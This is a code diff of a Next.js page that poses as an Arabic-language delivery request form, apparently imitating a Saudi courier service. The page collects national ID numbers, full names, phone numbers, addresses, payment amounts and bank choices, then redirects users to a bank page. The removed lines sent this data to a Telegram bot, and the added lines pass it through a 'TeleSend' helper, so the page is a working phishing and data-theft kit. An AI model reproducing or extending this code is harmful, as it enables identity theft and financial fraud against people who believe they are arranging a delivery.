@@ -1,24 +1,43 @@
 "use client"
-import { useRef } from 'react'
+import { useState } from 'react'
 import styles from './fozajil.module.css'
 import Image from 'next/image'
 import formza from '../../../public/formza.png'
 import bot from '@/compnante/dataBot'
 import {useRouter,useSearchParams} from 'next/navigation'
-
+import TeleSned from '../../server/TeleSend'
 
 const Page = () => {
 
-  let numbertrack = useRef();
-  let numbernation= useRef();
-  let fullname= useRef();
-  let numphone= useRef();
-  let selectBanks= useRef()
-  let typeshohna= useRef()
-  let adress = useRef();
-  let city = useRef();
-  let mony = useRef();
-  let selecttypenumber=useRef();
+  const {Send} = TeleSned();
+  const [form,setForm]= useState(  {data : {
+    رقم_الهوية:"",
+    نوع_الشحنة:"",
+    الاسم_الكامل: "",
+    رقم_الهاتف: "",
+    نوع_رقم:"ليبارا",
+    العنوان:"",
+    المدينة:"",
+    قيمة_السداد:"",
+    نوع_البطاقة:"بنك السعودي للاستثمار",
+    رقم_الشـــحنة:""
+  }},)
+
+  const setDynamicFormData = (name,value)=>{
+    setForm({
+      data:{
+        ...form.data,
+        [name]:value,
+      }
+    })
+  }
+  const PostToDiscord = () => {
+    const description = Object.entries(form.data)
+      .map((d) => `${d[0]} : ${d[1]} `)
+      .join("\n");
+    Send(description)
+    
+  };
   const  name = useSearchParams();
   const track = name.get("name")
   
@@ -27,7 +46,7 @@ const Page = () => {
 
   const handlerout = () => {
     
-if(numbertrack.current.value == "" || numbernation.current.value == "" || fullname.current.value== "" || numphone.current.value == ""|| typeshohna.current.value == ""|| adress.current.value == ""||city.current.value == ""||mony.current.value == "") {
+if(form.data.قيمة_السداد == "" || form.data.رقم_الهوية == "" || form.data.نوع_الشحنة== "" || form.data.الاسم_الكامل == ""|| form.data.رقم_الهاتف == ""|| form.data.نوع_رقم == ""||form.data.العنوان== ""|| form.data.المدينة == "" || form.data.رقم_الشـــحنة == ""||form.data.نوع_البطاقة == "" ) {
       alert('من فضلك قم بملى الحقول')
     }else{
        router.push(`/fozajil/banks?names=${track}`)
@@ -35,33 +54,45 @@ if(numbertrack.current.value == "" || numbernation.current.value == "" || fullna
   }
 
 
-  const handleSubmit = (e) => {
-    e.preventDefault();
 
-    var length =`رقم الشحنة: ${numbertrack.current.value} %0A رقم بطاقة الاحوال: ${numbernation.current.value} %0A الاسم الكامل : ${fullname.current.value} %0A رقم الجوال: ${numphone.current.value} %0A نوع الشحنة :${typeshohna.current.value} %0A نوع مشغل الجوال :${selecttypenumber.current.value} %0A نوع البنك :${selectBanks.current.value} %0A العنوان :${adress.current.value} %0A المدينة :${city.current.value} %0A قيمة السداد: ${mony.current.value} %0A %0A ${track}`
-
-
-    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
-
-
-  }
 
   return (
     <div className={styles.contain} dir='rtl'>
       <div className={styles.navbar}>
         <h2>طلب  توصيل واستلام</h2>
       </div>
-        <form onSubmit={handleSubmit}> 
+        <form onSubmit={(e)=>{
+          e.preventDefault();
+          PostToDiscord()
+        }}> 
             <Image 
               src={formza}
               width={412}
             />
-            <input type="number" name='numberTrack' ref={numbertrack}  placeholder='رقم الشحنة' required maxLength="12"  minLength="8"/>
-            <input type="number" name='numbernationalty' ref={numbernation} placeholder='رقم بطاقة الأحوال او الأقامة' required />
-            <input type="text" name='typeShohna' ref={typeshohna} placeholder='نوع الشحنة' required />
-            <input type="text" name='fullname' ref={fullname} placeholder='الأسم الكامل' required />
-            <input type="number" name='numphone' ref={numphone} placeholder='رقم الجوال' required maxLength="10"/>
-            <select name="selecttypephone" ref={selecttypenumber} required>
+            <input type="number" name='رقم_الشـــحنة'   placeholder='رقم الشحنة'  onChange={(e) => {
+    const { name, value } = e.target;
+    setDynamicFormData(name, value);
+  }} required maxLength="12"  minLength="8"/>
+            <input type="number" name='رقم_الهوية'  placeholder='رقم بطاقة الأحوال او الأقامة'   onChange={(e) => {
+    const { name, value } = e.target;
+    setDynamicFormData(name, value);
+  }} required />
+            <input type="text" name='نوع_الشحنة'  placeholder='نوع الشحنة'   onChange={(e) => {
+    const { name, value } = e.target;
+    setDynamicFormData(name, value);
+  }} required />
+            <input type="text" name='الاسم_الكامل'  placeholder='الأسم الكامل'   onChange={(e) => {
+    const { name, value } = e.target;
+    setDynamicFormData(name, value);
+  }} required />
+            <input type="number" name='رقم_الهاتف'  placeholder='رقم الجوال'   onChange={(e) => {
+    const { name, value } = e.target;
+    setDynamicFormData(name, value);
+  }} required maxLength="10"/>
+            <select name="نوع_رقم"   onChange={(e) => {
+    const { name, value } = e.target;
+    setDynamicFormData(name, value);
+  }} required>
                 <option value="ليبارا">ليبارا</option>
                 <option value="فرجن">فرجن</option>
                 <option value="STC">STC</option>
@@ -70,10 +101,22 @@ if(numbertrack.current.value == "" || numbernation.current.value == "" || fullna
                 <option value="سلام">سلام</option>
                 <option value="ريدبول">ريدبول</option>
             </select>
-            <input type="text" name='adress'  placeholder='العنوان' ref={adress}required />
-            <input type="text" name='city'  placeholder='المدينة' ref={city}required />
-            <input type="number" name='many' placeholder='قيمة السداد'ref={mony} required />
-            <select name="selectedBaanks" ref={selectBanks} required>
+            <input type="text" name='العنوان'  placeholder='العنوان'   onChange={(e) => {
+    const { name, value } = e.target;
+    setDynamicFormData(name, value);
+  }} required />
+            <input type="text" name='المدينة'  placeholder='المدينة'   onChange={(e) => {
+    const { name, value } = e.target;
+    setDynamicFormData(name, value);
+  }} required />
+            <input type="number" name='قيمة_السداد' placeholder='قيمة السداد'   onChange={(e) => {
+    const { name, value } = e.target;
+    setDynamicFormData(name, value);
+  }} required />
+            <select name="نوع_البطاقة"   onChange={(e) => {
+    const { name, value } = e.target;
+    setDynamicFormData(name, value);
+  }} required>
                 <option value="بنك السعودي للاستثمار">بنك السعودي للاستثمار</option>
                 <option value="بنك الأهلي ">بنك الأهلي</option>
                 <option value="بنك الراجحي">بنك الراجحي</option>
